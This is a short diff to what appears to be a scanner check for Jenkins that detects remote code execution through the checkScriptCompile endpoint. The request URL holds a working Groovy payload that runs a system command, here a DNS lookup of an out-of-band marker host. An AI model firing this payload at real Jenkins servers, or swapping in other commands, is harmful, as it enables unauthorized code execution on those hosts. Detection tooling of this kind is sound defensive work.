@@ -1,6 +1,6 @@
 send:
   - method: 'GET'
-    url: "/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@groovy.transform.ASTTest(value={%20Runtime.getRuntime().exec('ping%20DNS_MARKER')%20})%0Aclass%20Person%20{}"
+    url: "/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@groovy.transform.ASTTest(value={%20Runtime.getRuntime().exec('getent%20hosts%20DNS_MARKER')%20})%0Aclass%20Person%20{}"
 
 detect:
   - oob:
@@ -8,7 +8,9 @@ detect:
 
 meta-info:
   - type: rce
-  - threat: 90
+  - threat: 88
+  - applicable_for:
+    - fast
   - tags:
     - Jenkins
     - RCE
